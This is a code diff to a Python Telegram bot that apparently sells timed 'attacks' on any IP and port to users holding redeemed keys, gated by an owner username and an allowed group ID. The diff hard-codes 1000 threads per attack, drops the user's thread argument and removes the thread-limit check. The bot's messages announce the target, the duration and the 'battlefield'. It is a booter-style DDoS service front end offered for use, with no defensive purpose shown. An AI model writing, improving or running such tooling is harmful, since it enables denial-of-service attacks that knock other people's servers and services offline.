@@ -23,6 +23,7 @@ OWNER_USERNAME = "Riyahacksyt"  # Replace with your Telegram username (without @
 ALLOWED_GROUP_ID = -1002295161013  # Replace with your allowed group ID
 MAX_THREADS = 1500  # Default max threads
 max_duration = 150  # Default max attack duration
+DEFAULT_THREADS = 1000  # Default threads value for attacks
 
 # File to store key data
 KEY_FILE = "keys.txt"
@@ -273,7 +274,7 @@ async def attack_start(update: Update, context: CallbackContext):
 
     # Check if the user has a valid key
     if user_id in redeemed_users and redeemed_users[user_id] > time.time():
-        await update.message.reply_text("⚠️ *Enter the attack arguments: <ip> <port> <duration> <threads>*", parse_mode='Markdown')
+        await update.message.reply_text("⚠️ *Enter the attack arguments: <ip> <port> <duration>*", parse_mode='Markdown')
         return GET_ATTACK_ARGS
     else:
         await update.message.reply_text("❌ *You need a valid key to start an attack! Use /redeemkey to redeem a key.*", parse_mode='Markdown')
@@ -284,20 +285,18 @@ async def attack_input(update: Update, context: CallbackContext):
     global last_attack_time
 
     args = update.message.text.split()
-    if len(args) != 4:
-        await update.message.reply_text("❌ *Invalid input! Please enter <ip> <port> <duration> <threads>.*", parse_mode='Markdown')
+    if len(args) != 3:  # Only 3 arguments now: IP, port, duration
+        await update.message.reply_text("❌ *Invalid input! Please enter <ip> <port> <duration>.*", parse_mode='Markdown')
         return ConversationHandler.END  # Terminate the conversation
 
-    ip, port, duration, threads = args
+    ip, port, duration = args
     duration = int(duration)
-    threads = int(threads)
+
+    # Use the default threads value
+    threads = DEFAULT_THREADS
 
     if duration > max_duration:
         await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
-        return ConversationHandler.END  # Terminate the conversation
-
-    if threads > MAX_THREADS:
-        await update.message.reply_text(f"❌ *Number of threads exceeds the max limit ({MAX_THREADS})!*", parse_mode='Markdown')
         return ConversationHandler.END  # Terminate the conversation
 
     # Update the last attack time
@@ -307,7 +306,7 @@ async def attack_input(update: Update, context: CallbackContext):
         f"⚔️ *Attack Started!*\n"
         f"🎯 *Target*: {ip}:{port}\n"
         f"🕒 *Duration*: {duration} sec\n"
-        f"🧵 *Threads*: {threads}\n"
+        f"🧵 *Threads*: {threads} (default)\n"
         f"🔥 *Let the battlefield ignite! 💥*",
         parse_mode='Markdown'
     )
@@ -328,7 +327,7 @@ async def attack_input(update: Update, context: CallbackContext):
             f"✅ *Attack Finished!*\n"
             f"🎯 *Target*: {ip}:{port}\n"
             f"🕒 *Duration*: {duration} sec\n"
-            f"🧵 *Threads*: {threads}\n"
+            f"🧵 *Threads*: {threads} (default)\n"
             f"🔥 *The battlefield is now silent.*",
             parse_mode='Markdown'
         )
@@ -337,7 +336,7 @@ async def attack_input(update: Update, context: CallbackContext):
             f"❌ *Attack Failed!*\n"
             f"🎯 *Target*: {ip}:{port}\n"
             f"🕒 *Duration*: {duration} sec\n"
-            f"🧵 *Threads*: {threads}\n"
+            f"🧵 *Threads*: {threads} (default)\n"
             f"💥 *Error*: {stderr.decode().strip()}",
             parse_mode='Markdown'
         )
